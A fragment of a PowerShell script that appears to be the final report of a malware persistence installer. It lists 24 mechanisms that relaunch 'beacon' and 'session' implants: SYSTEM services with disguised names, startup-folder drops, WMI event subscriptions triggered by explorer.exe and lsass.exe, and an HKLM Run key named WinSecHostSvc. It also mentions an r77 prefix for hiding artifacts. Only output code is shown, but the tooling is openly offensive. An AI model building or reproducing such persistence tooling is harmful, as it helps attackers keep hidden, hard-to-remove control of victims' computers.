Write-Host "  --- SERVICES (2) ---" -ForegroundColor Magenta
Write-Host "  [16] CryptSvcMonitor        -> beacon  (AUTO_START, SYSTEM, fail-restart)"       -ForegroundColor Cyan
Write-Host "  [17] WmiPerfSvcHost         -> session (AUTO_START, SYSTEM, fail-restart)"       -ForegroundColor Cyan
Write-Host "  --- STARTUP FOLDERS (4) ---" -ForegroundColor Magenta
Write-Host "  [18] All-users LNK          -> beacon  ($AllUsersStartup)"                       -ForegroundColor Cyan
Write-Host "  [19] All-users BAT          -> session ($AllUsersStartup)"                       -ForegroundColor Cyan
Write-Host "  [20] Current-user EXE       -> beacon  ($CurrentUserStartup)"                    -ForegroundColor Cyan
Write-Host "  --- WMI (3) ---" -ForegroundColor Magenta
Write-Host "  [21] 30-min timer (VBScript)-> session (runs inside WmiPrvSE.exe)"               -ForegroundColor Cyan
Write-Host "  [22] explorer.exe start     -> beacon"                                           -ForegroundColor Cyan
Write-Host "  [23] lsass.exe start        -> session"                                          -ForegroundColor Cyan
Write-Host "  --- MISC (1) ---" -ForegroundColor Magenta
Write-Host "  [24] HKLM Run (WinSecHostSvc) -> session (fires at every user logon)"              -ForegroundColor Cyan
Write-Host ""
Write-Host "  Drop directories:" -ForegroundColor Yellow
foreach ($d in $DropDirs) { Write-Host "    $d" -ForegroundColor Yellow }
Write-Host ""
Write-Success "Result: $($script:Ok) OK  /  $($script:Fail) FAIL  /  24 total mechanisms"
if ($pfx) {
    Write-Warn "r77 prefix ENABLED -- artifacts prefixed: $pfx"
} else {
    Write-Info "r77 prefix: disabled"
}
Write-Host ""
